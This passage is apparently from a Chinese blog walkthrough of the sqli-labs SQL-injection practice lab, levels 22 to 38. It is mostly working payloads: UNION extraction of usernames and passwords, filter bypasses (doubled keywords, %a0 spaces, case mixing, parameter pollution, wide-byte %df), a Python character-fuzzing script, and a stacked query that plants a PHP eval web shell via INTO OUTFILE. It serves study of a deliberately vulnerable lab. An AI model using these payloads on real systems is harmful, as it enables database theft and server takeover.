(Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">84.0</span>) Gecko<span class="operator">/</span><span class="number">20100101</span> Firefox<span class="operator">/</span><span class="number">84.0</span></span><br><span class="line">Accept: text<span class="operator">/</span>html,application<span class="operator">/</span>xhtml<span class="operator">+</span>xml,application<span class="operator">/</span>xml;q<span class="operator">=</span><span class="number">0.9</span>,image<span class="operator">/</span>webp,<span class="operator">*</span><span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 24</span></span><br><span class="line"><span class="comment">Origin: http://sqli</span></span><br><span class="line"><span class="comment">Cookie: uname=YWRtbiIgdW5pb24gc2VsZWN0IDEsZGF0YWJhc2UoKSwzIw==</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://sqli/Less-22/</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Cookie: uname=YWRtbiIgdW5pb24gc2VsZWN0IDEsZGF0YWJhc2UoKSwzIw==</span></span><br><span class="line"><span class="comment">admn&quot; union select 1,database(),3# 的base64编码</span></span><br></pre></td></tr></table></figure><h3 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-23</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,&#x27;</span><span class="number">3</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-23</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;),&#x27;</span><span class="number">3</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-23</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),&#x27;</span><span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h3><h4 id="简单的二次注入"><a href="#简单的二次注入" class="headerlink" title="简单的二次注入"></a>简单的二次注入</h4><p>环境了一点问题，后面用dockerfile写一个搭建环境，从新打一下试试,布谷布谷</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h3><h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p>过滤了 and or ,好像并不是很需要呀</p><p>information_schema库中 or 可以双写绕过</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-25</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,database(),3-- +</span></span><br><span class="line"><span class="string">http://sqli/Less-25/?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> infoorrmation_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span><span class="comment">-- +  双写绕过</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-25</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;-- +</span></span><br><span class="line"><span class="string">http://sqli/Less-25/?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(concat(username,<span class="number">0x7e</span>,passwoorrd)),<span class="number">3</span> <span class="keyword">from</span> users<span class="comment">-- + #双写绕过</span></span><br></pre></td></tr></table></figure><h3 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h3><h4 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h4><p>两种绕过思路</p><p><strong>第一种 采用逻辑运算符</strong></p><p><strong>第二种 采用一些特殊的url编码代替</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_url</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        tmp1=changeToHex(i)</span><br><span class="line">        urlstring=url.<span class="built_in">format</span>(tmp1)</span><br><span class="line">        re=req.get(urlstring)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Dumb&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;good!this can use&#x27;</span>,tmp1)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeToHex</span>(<span class="params">num</span>):</span></span><br><span class="line">    tmp=<span class="built_in">hex</span>(num).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(tmp)&lt;<span class="number">2</span>:</span><br><span class="line">        tmp=<span class="string">&#x27;0&#x27;</span>+tmp</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;%&#x27;</span>+tmp</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url=<span class="string">&quot;http://sqli/less-26/?id=0&#x27;&#123;0&#125;||&#123;0&#125;&#x27;1&#x27;=&#x27;1&quot;</span></span><br><span class="line">    test_url(url)</span><br></pre></td></tr></table></figure><p><img src="/2021/01/15/sql-libs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/image-20210120165239394.png" class="lazyload" data-srcset="/2021/01/15/sql-libs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/image-20210120165239394.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210120165239394"></p><p>tips: 感觉作用并不是很明显，在这里仅仅相当与测出了可以代替字符和被过滤字符的集合，因为||左右加不加空格都可以</p><p>查看源码知道 %a0 都是被过滤字符</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-26</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;%a0union%a0select%a01,database(),2%a0||%a0&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-26</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;%a0union%a0select%a01,2,group_concat(column_name)%a0from%a0infoorrmation_schema.columns%a0where%a0table_name=&#x27;</span>users<span class="string">&#x27;%a0||%a0&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">13</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-26</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;%a0union%a0select%a01,2,group_concat(concat(username,0x7e,passwoorrd))%a0from%a0security.users%a0where%0a&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>当然远不这一种注入方式 updatexml报错注入 以及 bool盲注都可以</p><h3 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h3><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><p>在26题的基础上进行了一点改进，仅仅是一个大小写绕过union select 的点 ，而且 and or被允许使用了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-27</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;%a0uNion%a0seLect%a01,database(),2%a0||%a0&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-27</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;%a0uNion%a0seLect%a01,2,group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name=&#x27;</span>users<span class="string">&#x27;%a0||%a0&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">13</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-27</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;%a0uNion%a0sElect%a01,2,group_concat(concat(username,0x7e,password))%a0from%a0security.users%a0where%0a&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h3><h4 id="union-select被彻底过滤（双写，大小写都绕不过）"><a href="#union-select被彻底过滤（双写，大小写都绕不过）" class="headerlink" title="union select被彻底过滤（双写，大小写都绕不过）"></a>union select被彻底过滤（双写，大小写都绕不过）</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-28</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">0</span><span class="operator">%</span><span class="number">27</span>)<span class="operator">%</span>A0uNion<span class="operator">%</span>A0seLect<span class="operator">%</span>A01,<span class="number">2</span>,<span class="number">3</span><span class="operator">||</span>(<span class="operator">%</span><span class="number">271</span><span class="operator">%</span><span class="number">27</span>)<span class="operator">=</span>(<span class="operator">%</span><span class="number">271</span>                                              http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-28</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">0</span><span class="operator">%</span><span class="number">27</span>)<span class="operator">%</span>A0uNion<span class="operator">%</span>A0seLect<span class="operator">%</span>A01,group_concat(table_name),<span class="number">3</span><span class="operator">%</span>A0from<span class="operator">%</span>A0information_schema.tables<span class="operator">%</span>A0where<span class="operator">%</span>A0table_schema<span class="operator">=</span><span class="operator">%</span><span class="number">27</span>security<span class="operator">%</span><span class="number">27</span><span class="operator">||</span>(<span class="operator">%</span><span class="number">271</span><span class="operator">%</span><span class="number">27</span>)<span class="operator">=</span>(<span class="operator">%</span><span class="number">2712</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-28</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">0</span><span class="operator">%</span><span class="number">27</span>)<span class="operator">%</span>A0uNion<span class="operator">%</span>A0seLect<span class="operator">%</span>A01,group_concat(concat(username,<span class="number">0x7e</span>,password)),<span class="number">3</span><span class="operator">%</span>A0from<span class="operator">%</span>A0security.users<span class="operator">%</span>A0where<span class="operator">%</span>A0(<span class="operator">%</span><span class="number">271</span><span class="operator">%</span><span class="number">27</span>)<span class="operator">=</span>(<span class="operator">%</span><span class="number">271</span></span><br></pre></td></tr></table></figure><h3 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h3><h4 id="HPP（http参数污染绕过）"><a href="#HPP（http参数污染绕过）" class="headerlink" title="HPP（http参数污染绕过）"></a>HPP（http参数污染绕过）</h4><p>因为我本地没有装tomcat环境，所以简单写一下过程，后面会在服务器上搭建一个完全版本的sql-libs</p><p>HPP 是一种简单的绕过方式，利用的不同的服务器对http参数的处理方式存在差异从而绕过一些限制</p><blockquote><p>假如我传入 了 ?id=1&amp;&amp;id=2 相同参数名不同值</p><p>对于apache来说，处理后面 id=2</p><p>对于tomcat来说，处理前面 id=1</p></blockquote><p>所以绕过方式很简单 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqli<span class="operator">/</span>Less<span class="number">-29</span><span class="operator">/</span>login.php?id<span class="operator">=</span><span class="number">2</span><span class="operator">&amp;&amp;</span>id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,&#x27;</span><span class="number">3</span></span><br><span class="line">sqli<span class="operator">/</span>Less<span class="number">-29</span><span class="operator">/</span>login.php?id<span class="operator">=</span><span class="number">2</span><span class="operator">&amp;&amp;</span>id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,database(),&#x27;</span><span class="number">3</span></span><br><span class="line">sqli<span class="operator">/</span>Less<span class="number">-29</span><span class="operator">/</span>login.php?id<span class="operator">=</span><span class="number">2</span><span class="operator">&amp;&amp;</span>id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> </span><br><span class="line">sqli<span class="operator">/</span>Less<span class="number">-29</span><span class="operator">/</span>login.php?id<span class="operator">=</span><span class="number">2</span><span class="operator">&amp;&amp;</span>id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> </span><br></pre></td></tr></table></figure><h3 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h3><p>跟29关差不多，只是闭合方式的变化</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqli<span class="operator">/</span>Less<span class="number">-30</span><span class="operator">/</span>login.php?id<span class="operator">=</span><span class="number">2</span><span class="operator">&amp;&amp;</span>id<span class="operator">=</span><span class="number">-1</span>&quot; union select 1,2,&quot;<span class="number">3</span></span><br><span class="line">sqli<span class="operator">/</span>Less<span class="number">-30</span><span class="operator">/</span>login.php?id<span class="operator">=</span><span class="number">2</span><span class="operator">&amp;&amp;</span>id<span class="operator">=</span><span class="number">-1</span>&quot; union select 1,database(),&quot;<span class="number">3</span></span><br><span class="line">sqli<span class="operator">/</span>Less<span class="number">-30</span><span class="operator">/</span>login.php?id<span class="operator">=</span><span class="number">2</span><span class="operator">&amp;&amp;</span>id<span class="operator">=</span><span class="number">-1</span>&quot; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; and &quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span> </span><br><span class="line">sqli<span class="operator">/</span>Less<span class="number">-30</span><span class="operator">/</span>login.php?id<span class="operator">=</span><span class="number">2</span><span class="operator">&amp;&amp;</span>id<span class="operator">=</span><span class="number">-1</span>&quot; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; and &quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span> </span><br></pre></td></tr></table></figure><h3 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h3><p>跟29关差不多，只是闭合方式的变化</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqli<span class="operator">/</span>Less<span class="number">-31</span><span class="operator">/</span>login.php?id<span class="operator">=</span><span class="number">2</span><span class="operator">&amp;&amp;</span>id<span class="operator">=</span><span class="number">-1</span>&quot;) union select 1,2,&quot;<span class="number">3</span></span><br><span class="line">sqli<span class="operator">/</span>Less<span class="number">-31</span><span class="operator">/</span>login.php?id<span class="operator">=</span><span class="number">2</span><span class="operator">&amp;&amp;</span>id<span class="operator">=</span><span class="number">-1</span>&quot;) union select 1,database(),&quot;<span class="number">3</span></span><br><span class="line">sqli<span class="operator">/</span>Less<span class="number">-31</span><span class="operator">/</span>login.php?id<span class="operator">=</span><span class="number">2</span><span class="operator">&amp;&amp;</span>id<span class="operator">=</span><span class="number">-1</span>&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; and (&quot;<span class="number">1</span>&quot;)=(&quot;<span class="number">1</span> </span><br><span class="line">sqli<span class="operator">/</span>Less<span class="number">-31</span><span class="operator">/</span>login.php?id<span class="operator">=</span><span class="number">2</span><span class="operator">&amp;&amp;</span>id<span class="operator">=</span><span class="number">-1</span>&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; and (&quot;<span class="number">1</span>&quot;)=(&quot;<span class="number">1</span> </span><br></pre></td></tr></table></figure><h3 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h3><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-32</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>df<span class="string">&#x27; union select 1,2,3--+</span></span><br><span class="line"><span class="string">http://sqli/less-32/?id=-1%df&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),<span class="number">3</span><span class="comment">--+</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>less<span class="number">-32</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>df<span class="string">&#x27; union select 1,group_concat(concat(username,0x7e,password)),3 from users--+</span></span><br></pre></td></tr></table></figure><h3 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h3><p>宽字节注入，这次使用了addslashes()函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-33</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>df<span class="string">&#x27; union select 1,2,3--+</span></span><br><span class="line"><span class="string">http://sqli/less-33/?id=-1%df&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),<span class="number">3</span><span class="comment">--+</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>less<span class="number">-33</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>df<span class="string">&#x27; union select 1,group_concat(concat(username,0x7e,password)),3 from users--+</span></span><br></pre></td></tr></table></figure><h4 id="如何安全使用addslashes-函数"><a href="#如何安全使用addslashes-函数" class="headerlink" title="如何安全使用addslashes()函数"></a>如何安全使用addslashes()函数</h4><blockquote><p>使用 addslashes(),我们需要将 mysql_query 设置为 binary 的方式，可以防止宽字节注入漏洞</p><p>Mysql_query(“SET </p><p>character_set_connection=gbk,character_set_result=gbk,character_set_client=binary”,$conn);</p></blockquote><h3 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h3><h4 id="编码转换注入"><a href="#编码转换注入" class="headerlink" title="编码转换注入"></a>编码转换注入</h4><p>本题其实仍然可以采用宽字节注入的方法来解题</p><p>但是sql注入天书给了一种跟好的思路，即将utf-8转为utf-16或者utf-32 </p><p>同时linux系统本身提供了一个好用的编码转换命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo \&#x27;|iconv -f utf-8 -t utf-16 #��&#x27;</span><br><span class="line">echo \&#x27;|iconv -f utf-8 -t utf-32 #��&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>�<span class="string">&#x27; or 1#&amp;passwd=123</span></span><br><span class="line"><span class="string">uname=�&#x27;</span> <span class="keyword">or</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>))#<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">123</span></span><br><span class="line">uname<span class="operator">=</span>�<span class="string">&#x27; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479),0x7e))#&amp;passwd=123</span></span><br><span class="line"><span class="string">uname=�&#x27;</span> <span class="keyword">or</span> extractvalue(<span class="number">1</span>,substr(concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x7573657273</span>),<span class="number">0x7e</span>),<span class="number">1</span>,<span class="number">32</span>))#<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">123</span></span><br></pre></td></tr></table></figure><h3 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-35</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,<span class="number">2</span>,database()<span class="comment">--+</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-35</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,<span class="number">2</span>,group_concat(table_name)<span class="operator">%</span><span class="number">20</span><span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>information_schema.tables<span class="operator">%</span><span class="number">20</span><span class="keyword">where</span><span class="operator">%</span><span class="number">20</span>table_schema<span class="operator">=</span><span class="number">0x7365637572697479</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><h3 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-35</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span>$df<span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,<span class="number">2</span>,database()<span class="comment">--+</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-36</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>df<span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,<span class="number">2</span>,group_concat(table_name)<span class="operator">%</span><span class="number">20</span><span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>information_schema.tables<span class="operator">%</span><span class="number">20</span><span class="keyword">where</span><span class="operator">%</span><span class="number">20</span>table_schema<span class="operator">=</span><span class="number">0x7365637572697479</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><blockquote><p>在使用 mysql_real_escape_string()时，如何能够安全的防护这种问题，需要将 mysql 设置为 </p><p>gbk 即可。 </p><p>设置代码： </p><p>Mysql_set_charset(‘gbk’,’$conn’) </p></blockquote><h3 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>�<span class="string">&#x27; or 1#&amp;passwd=123</span></span><br><span class="line"><span class="string">uname=�&#x27;</span> <span class="keyword">or</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>))#<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">123</span></span><br><span class="line">uname<span class="operator">=</span>�<span class="string">&#x27; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479),0x7e))#&amp;passwd=123</span></span><br><span class="line"><span class="string">uname=�&#x27;</span> <span class="keyword">or</span> extractvalue(<span class="number">1</span>,substr(concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x7573657273</span>),<span class="number">0x7e</span>),<span class="number">1</span>,<span class="number">32</span>))#<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">123</span></span><br></pre></td></tr></table></figure><h3 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h3><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-38</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">0</span><span class="operator">%</span><span class="number">27</span>;<span class="keyword">insert</span><span class="operator">%</span><span class="number">20</span><span class="keyword">into</span><span class="operator">%</span><span class="number">20</span>users(id,username,password)<span class="operator">%</span><span class="number">20</span><span class="keyword">values</span><span class="operator">%</span><span class="number">20</span>(<span class="operator">%</span><span class="number">2739</span><span class="operator">%</span><span class="number">27</span>,<span class="operator">%</span><span class="number">27</span>M0th<span class="operator">%</span><span class="number">27</span>,<span class="operator">%</span><span class="number">27</span>M0th<span class="operator">%</span><span class="number">27</span>)<span class="comment">--%20a 能加行</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-38</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">0</span><span class="operator">%</span><span class="number">27</span>;<span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,<span class="operator">%</span><span class="number">22</span><span class="operator">%</span><span class="number">3</span>C?php<span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">20</span><span class="variable">@eval</span>($_POST[<span class="operator">%</span><span class="number">27</span>cmd<span class="operator">%</span><span class="number">27</span>]);?<span class="operator">%</span><span class="number">3</span>E<span class="operator">%</span><span class="number">22</span>,<span class="number">3</span><span class="operator">%</span><span class="number">20</span><span class="keyword">into</span><span class="operator">%</span><span class="number">20</span>outfile<span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">22</span>D:\\phpstudy_pro\\WWW\\sqli\\less<span class="number">-38</span>\\webshell1.php<span 